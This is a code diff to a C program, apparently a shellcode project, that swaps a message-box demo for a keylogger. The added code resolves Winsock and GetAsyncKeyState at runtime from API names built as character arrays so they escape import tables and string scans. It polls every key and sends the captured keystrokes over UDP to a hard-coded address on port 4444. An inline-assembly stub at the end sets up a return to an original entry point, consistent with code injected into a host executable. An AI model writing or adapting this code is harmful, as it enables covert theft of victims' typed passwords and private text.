@@ -1,8 +1,20 @@
-#include <Windows.h>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <windows.h>
 #include <stdio.h>
+#include <fileapi.h>
+#include <stdbool.h>
+#include <conio.h>
 #include "shellcode_test.h"
 
 #define ORIGINAL_ENTERY_ADDRESS_PLACE_HOLDER 0xBBBBBBBB
+// Defines for keylogger.
+#define MAX_MSG_LENGTH 1024
+#define SYS_CALL_SUCCSSES 0
+#define PORT_NUM 4444
+#define MAX_MSG_LENGTH 1024
+#define BUFFER_LENGTH 10
+#define KEY_PRESSED_SINCE_LAST_CALL 0x0001
 
 #define TO_LOWER(c){\
 			if(c >= 'A' && c <= 'Z')\
@@ -37,7 +49,7 @@ __forceinline inline BOOL str_cmp2(PCHAR str1, PCHAR str2)
 		TO_LOWER(current_char_b);
 		str1 += 1;
 		str2 += 1;
-	} 	while (*str1 != 0 && *str2 != 0 && current_char_a == current_char_b);
+	} while (*str1 != 0 && *str2 != 0 && current_char_a == current_char_b);
 	if (*str1 == 0 && *str2 == 0)
 		return TRUE;
 	return FALSE;
@@ -101,16 +113,27 @@ __forceinline LPVOID get_module_by_name(PWCHAR module_name)
 
 int main(VOID)
 {
-	HMODULE user32_dll = NULL;
-	DWORD* dwptr;
-	HANDLE hProcess;
+	WSADATA wsa = { 0 };
+	SOCKET client_socket = NULL;
+	struct sockaddr_in server_address = { 0 };
+	char msg_buf[MAX_MSG_LENGTH] = { 0 };
+	char ws_dll_name[] = { 'W', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 };
+	char WSA_startup_name[] = { 'W', 'S', 'A', 'S', 't', 'a', 'r', 't', 'u', 'p', 0 };
+	char socket_function_name[] = { 's', 'o', 'c', 'k', 'e', 't', 0 };
+	char getAsyncKeyState_name[] = { 'G', 'e', 't', 'A', 's', 'y', 'n', 'c', 'K', 'e', 'y', 'S', 't', 'a', 't', 'e', 0 };
+	char htons_name[] = { 'h', 't', 'o', 'n', 's', 0 };
+	char inet_addr_name[] = { 'i', 'n', 'e', 't', '_', 'a', 'd', 'd', 'r', 0 };
+	char sendto_name[] = { 's', 'e', 'n', 'd', 't', 'o', 0 };
+	char server_ip[] = { '1', '2', '7', '.', '0', '.', '0', '.', '1', 0 };
+
 	char msg_box_content[] = { 'e','x','p','l','o','r','e','r','.','e','x','e',0 };
 	char user32_dll_name[] = { 'u', 's', 'e', 'r', '3','2','.','d','l','l', 0 };
-	char msgbox_name[] = { 'M', 'e', 's', 's', 'a','g','e','B','o','x', 'A', 0 };
 	char load_library_name[] = { 'l', 'o', 'a', 'd', 'l', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
 	char get_proc_address_name[] = { 'g', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0 };
 	WCHAR kernel32_dll_name[] = { 'K', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };
-	HMODULE kernel32_dll;
+	HMODULE kernel32_dll = NULL;
+	HMODULE user32_dll = NULL;
+	HMODULE ws_dll = NULL;
 
 	// Get kernel32.dll
 	kernel32_dll = get_module_by_name(kernel32_dll_name);
@@ -132,16 +155,98 @@ int main(VOID)
 	// Get user32.dll
 	user32_dll = M_loadLibraryA(user32_dll_name);
 	if (user32_dll == NULL)
+		goto end;
+
+	// Get windows socket dll
+	ws_dll = M_loadLibraryA(ws_dll_name);
+	if (ws_dll == NULL)
+		goto end;
+
+	// Get M_WSAStartup function.
+	int (WINAPI * M_WSAStartup)(WORD wVersionRequired, _Out_opt_ LPWSADATA lpWSAData) =
+		(int (WINAPI*)(WORD, _Out_opt_ LPWSADATA)) M_getProcAddress(ws_dll, WSA_startup_name);
+	if (M_WSAStartup == NULL)
+		goto end;
+
+	// Get socket function
+	SOCKET(WSAAPI * M_socket)(_In_opt_ int af, _In_opt_ int type, _In_opt_ int protocol) =
+		(SOCKET(WSAAPI*) (_In_opt_ int, _In_opt_ int, _In_opt_ int)) M_getProcAddress(ws_dll, socket_function_name);
+	if (M_socket == NULL)
+		goto end;
+
+	// GetAsyncKeyState function.
+	SHORT(WINAPI * M_GetAsyncKeyState)(_In_opt_ vKey) =
+		(SHORT(WINAPI*)(_In_opt_)) M_getProcAddress(user32_dll, getAsyncKeyState_name);
+	if (M_GetAsyncKeyState == NULL)
+		goto end;
+
+	// Get sendto function.
+	int(WINAPI * M_sendto)(_In_opt_ SOCKET s, _In_opt_ const char* buf, _In_opt_ int len, _In_opt_ int flags
+		, _In_opt_ const struct sockaddr* to, _In_opt_ int tolen) =
+		(int(WINAPI*)(_In_opt_ SOCKET, _In_opt_ const char, _In_opt_ int, _In_opt_ int
+			, _In_opt_ const struct sockaddr*, _In_opt_ int)) M_getProcAddress(ws_dll, sendto_name);
+	if (M_sendto == NULL)
+		goto end;
+
+
+	// Get htons function.
+	u_short(WINAPI * M_htons)(_In_opt_ u_short hostshort) =
+		(u_short(WINAPI*)(_In_opt_ u_short)) M_getProcAddress(ws_dll, htons_name);
+	if (M_htons == NULL)
+		goto end;
+
+	// Get inet_addr function.
+	unsigned long(WINAPI * M_inet_addr)(_In_opt_ a) =
+		(unsigned long(WINAPI*)(_In_opt_)) M_getProcAddress(ws_dll, inet_addr_name);
+	if (M_inet_addr == NULL)
+		goto end;
+
+	// Start of keylogger.
+	if (M_WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
 	{
-		printf("%d", GetLastError());
 		goto end;
 	}
-	// Get messageBoxA function
-	DWORD(WINAPI * M_messageBoxA)(_In_opt_ HWND hwnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType) =
-		(int (WINAPI*)(_In_opt_ HWND, _In_opt_ LPCSTR, _In_opt_ LPCSTR, _In_ UINT)) M_getProcAddress(user32_dll, msgbox_name);
-	M_messageBoxA(NULL, msg_box_content, msg_box_content, 0);
 
-	MessageBoxA(NULL, msg_box_content, msg_box_content, 0);
+	client_socket = M_socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+	if (client_socket == INVALID_SOCKET)
+	{
+		goto end;
+	}
+
+	server_address.sin_family = AF_INET;
+	server_address.sin_port = M_htons(PORT_NUM);
+	server_address.sin_addr.S_un.S_addr = M_inet_addr(server_ip);
+	int key_counter = 0;
+	//start communication
+	while (1)
+	{
+		for (int i = 8; i <= 190; i++) {
+			if (M_GetAsyncKeyState(i) & KEY_PRESSED_SINCE_LAST_CALL)
+			{
+				msg_buf[key_counter] = i;
+				key_counter++;
+			}
+		}
+
+		if (key_counter < BUFFER_LENGTH)
+			continue;
+
+		//send the message
+		if (M_sendto(client_socket, msg_buf, BUFFER_LENGTH, 0, (struct sockaddr*)&server_address, sizeof(server_address)) == SOCKET_ERROR)
+		{
+			goto end;
+			// TODO: check what exit does.
+			exit(EXIT_FAILURE);
+		}
+
+		// Reset buffer after sending message.
+		key_counter = 0;
+	}
+
+
 end:
-	return 0;
+	_asm
+	{
+		mov eax, ORIGINAL_ENTERY_ADDRESS_PLACE_HOLDER
+	}
 }
